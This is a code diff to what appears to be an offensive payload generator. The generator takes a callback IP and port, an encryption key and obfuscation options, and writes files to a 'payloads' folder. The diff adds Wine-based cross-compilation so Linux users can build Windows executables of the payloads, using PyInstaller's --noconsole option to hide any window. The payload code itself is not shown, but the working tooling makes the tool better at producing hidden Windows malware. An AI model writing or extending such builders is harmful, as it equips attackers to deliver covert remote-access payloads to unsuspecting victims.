@@ -436,13 +436,92 @@ def obfuscate_packed(code):
     return stub
 
 
-def _can_compile(target_os):
-    host = sys.platform.lower()
-    if target_os == "windows" and not host.startswith("win"):
-        return False, "Cannot compile Windows .exe from Linux. Use PyInstaller on a Windows machine, or just use the .py file."
-    if target_os == "linux" and host.startswith("win"):
-        return False, "Cannot compile Linux binary from Windows. Use PyInstaller on a Linux machine, or just use the .py file."
-    return True, None
+WINE_PYTHON_URL = "https://www.python.org/ftp/python/3.12.3/python-3.12.3-embed-amd64.zip"
+GET_PIP_URL = "https://bootstrap.pypa.io/get-pip.py"
+ENTROPY_DIR = os.path.expanduser("~/.entropy")
+
+
+def _ensure_wine_python(verbose=True):
+    """Download and set up portable Windows Python + PyInstaller via Wine."""
+    wdir = os.path.join(ENTROPY_DIR, "wine_python")
+    os.makedirs(wdir, exist_ok=True)
+    python_exe = os.path.join(wdir, "python.exe")
+
+    if os.path.exists(python_exe):
+        return python_exe
+
+    if verbose:
+        print("  [*] Setting up portable Windows Python (first time)...")
+
+    import urllib.request
+    import zipfile
+
+    # Download embeddable Python
+    zip_path = os.path.join(ENTROPY_DIR, "python.zip")
+    try:
+        if verbose:
+            print(f"  [*] Downloading embeddable Python 3.12...")
+        urllib.request.urlretrieve(WINE_PYTHON_URL, zip_path)
+        with zipfile.ZipFile(zip_path, "r") as zf:
+            zf.extractall(wdir)
+        os.remove(zip_path)
+    except Exception as e:
+        if verbose:
+            print(f"  [!] Failed to download Python: {e}")
+        return None
+
+    # Rename ._pth to enable site-packages
+    for f in os.listdir(wdir):
+        if f.endswith("._pth"):
+            bak = f.replace("._pth", ".pth.bak")
+            os.rename(os.path.join(wdir, f), os.path.join(wdir, bak))
+            break
+
+    if verbose:
+        print("  [*] Installing pip...")
+    pip_script = os.path.join(ENTROPY_DIR, "get-pip.py")
+    try:
+        urllib.request.urlretrieve(GET_PIP_URL, pip_script)
+        _subprocess.run(
+            ["wine", python_exe, pip_script],
+            capture_output=True, text=True, timeout=120,
+        )
+        os.remove(pip_script)
+    except Exception as e:
+        if verbose:
+            print(f"  [!] Failed to install pip: {e}")
+        if os.path.exists(pip_script):
+            os.remove(pip_script)
+        return None
+
+    if verbose:
+        print("  [*] Installing PyInstaller...")
+    try:
+        _subprocess.run(
+            ["wine", python_exe, "-m", "pip", "install", "pyinstaller"],
+            capture_output=True, text=True, timeout=180,
+        )
+    except Exception as e:
+        if verbose:
+            print(f"  [!] Failed to install PyInstaller: {e}")
+        return None
+
+    if verbose:
+        print("  [*] Wine Python environment ready")
+    return python_exe
+
+
+def _clean_pyinstaller_artifacts(name):
+    for p in ["build", name + ".spec"]:
+        pth = os.path.join(os.getcwd(), p)
+        if os.path.exists(pth):
+            if os.path.isdir(pth):
+                shutil.rmtree(pth, ignore_errors=True)
+            else:
+                try:
+                    os.remove(pth)
+                except Exception:
+                    pass
 
 
 def try_compile_exe(py_path, output_dir="payloads", verbose=True):
@@ -503,16 +582,66 @@ def try_compile_exe(py_path, output_dir="payloads", verbose=True):
             print(f"  [!] Compilation error: {e}")
         return None
     finally:
-        for p in ["build", name + ".spec"]:
-            pth = os.path.join(os.getcwd(), p)
-            if os.path.exists(pth):
-                if os.path.isdir(pth):
-                    shutil.rmtree(pth, ignore_errors=True)
-                else:
-                    try:
-                        os.remove(pth)
-                    except Exception:
-                        pass
+        _clean_pyinstaller_artifacts(name)
+
+
+def compile_windows_via_wine(py_path, output_dir="payloads", verbose=True):
+    """Cross-compile a Windows .exe from Linux using Wine + PyInstaller."""
+    if not shutil.which("wine"):
+        if verbose:
+            print("  [!] wine not found. Install it:")
+            print("      sudo apt install wine wine32 wine64")
+            print("  [*] Falling back to .py file only")
+        return None
+
+    name = os.path.splitext(os.path.basename(py_path))[0]
+    python_exe = _ensure_wine_python(verbose)
+    if not python_exe:
+        return None
+
+    if verbose:
+        print("  [*] Compiling Windows .exe via Wine...")
+
+    try:
+        result = _subprocess.run(
+            [
+                "wine", python_exe, "-m", "PyInstaller",
+                "--onefile", "--noconsole",
+                "--distpath", output_dir,
+                "--name", name,
+                py_path,
+            ],
+            capture_output=True, text=True, timeout=300,
+        )
+
+        if result.returncode != 0:
+            if verbose:
+                err = result.stderr.strip() or result.stdout.strip()
+                print(f"  [!] Wine/PyInstaller error: {err[:500]}")
+            return None
+
+        exe_path = os.path.join(output_dir, name + ".exe")
+        if os.path.exists(exe_path):
+            return exe_path
+
+        for f in os.listdir(output_dir):
+            if f == name + ".exe":
+                return os.path.join(output_dir, f)
+
+        if verbose:
+            print(f"  [!] .exe not found after compilation")
+        return None
+
+    except _subprocess.TimeoutExpired:
+        if verbose:
+            print("  [!] Compilation timed out (5 min)")
+        return None
+    except Exception as e:
+        if verbose:
+            print(f"  [!] Wine compilation error: {e}")
+        return None
+    finally:
+        _clean_pyinstaller_artifacts(name)
 
 
 def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", compile_exe=False, output_dir="payloads", name=None):
@@ -549,17 +678,17 @@ def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", co
 
     exe_path = None
     if compile_exe:
-        ok, msg = _can_compile(os_type)
-        if ok:
+        host = sys.platform.lower()
+        native = (os_type == "windows" and host.startswith("win")) or \
+                 (os_type == "linux" and not host.startswith("win"))
+
+        if native:
             print("  [*] Compiling to binary with PyInstaller...")
             exe_path = try_compile_exe(filepath, output_dir)
-        elif not ok:
-            print(f"  [!] {msg}")
-
-    ext = ".exe" if os_type == "windows" and exe_path and not exe_path.endswith(".exe") else ""
-    if exe_path and ext:
-        actual = exe_path + ext
-        if os.path.exists(actual):
-            exe_path = actual
+        elif os_type == "windows":
+            exe_path = compile_windows_via_wine(filepath, output_dir)
+        else:
+            print("  [!] Cannot compile Linux binary from Windows.")
+            print("      Use the .py file or compile on Linux.")
 
     return filepath, key.decode(), exe_path
